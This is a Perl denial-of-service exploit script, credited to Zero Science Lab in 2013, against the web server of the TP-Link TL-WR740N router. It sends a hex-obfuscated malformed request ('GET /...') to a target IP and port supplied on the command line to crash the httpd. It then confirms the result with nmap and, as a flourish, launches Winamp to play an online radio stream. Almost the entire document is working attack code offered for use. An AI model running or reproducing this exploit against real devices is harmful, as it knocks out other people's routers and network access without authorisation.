# Copyleft (c) 2013, Zero Science Lab
# article: http://chmodsecurity.com.br/artigo/15/explorando-falha-tp-link-tl-wr740n.html

 
use IO::Socket;
 
$ip="$ARGV[0]"; $port="$ARGV[1]";
 
print "\n\n\x20"."\x1f"x42 ."\n";
print "\x20\x1f"."\x20"x40 ."\x1f\n";
print "\x20\x1f  TP-Link TL-WR740N httpd DoS Exploit   \x1f\n";
print "\x20\x1f"."\x20"x40 ."\x1f\n";
print "\x20\x1f"."\x20"x7 ."\x16"x5 ."\x20"x15 ."\x16"x5 ."\x20"x8 ."\x1f\n";
print "\x20\x1f"."\x20"x9 ."\x16"."\x20"x19 ."\x16"."\x20"x10 ."\x1f\n";
print "\x20" ."\x1f"x42 ."\n";
print "\x20\x4" ."\x20"x40 ."\x4\n";
print "\x20" ."\x1e" x 42 ."\n";
 
if($#ARGV<1)
{
   print "\n\n\x20\x20\x1a\x20Usage: $0 <ip> <port>\n\n";
   exit();
}
 
$socket=IO::Socket::INET->new(
Proto => "tcp",
PeerAddr => $ip,
PeerPort => $port
);
 
$ta4ke="\x47\x45\x54\x20".
       "\x2f\x2e\x2e\x2e".
       "\x20\x48\x54\x54".
       "\x50\x2f\x31\x2e".
       "\x31\x0d\x0a\x0d".
       "\x0a";
 
print "\n\x20\x1a\x20Sending evil payload...\n"; sleep 2;
print $socket "$ta4ke"; sleep 5; close $socket;
print "\x20\x1a\x20HTTPd successfully poked.\n"; sleep 2;
print "\x20\x1a\x20Verifying with Nmap...\n"; sleep 2;
system("nmap -Pn $ip -p $port");
print "\n\x20\x1a\x20Playing goa-psy...\n"; sleep 2;
system("start C:\\Progra~1\\Winamp\\winamp.exe http://scfire-ntc-aa01.stream.aol.com:80/stream/1008");
sleep 1; print "\x20\x1a\x20All Done!\n"; sleep 1;
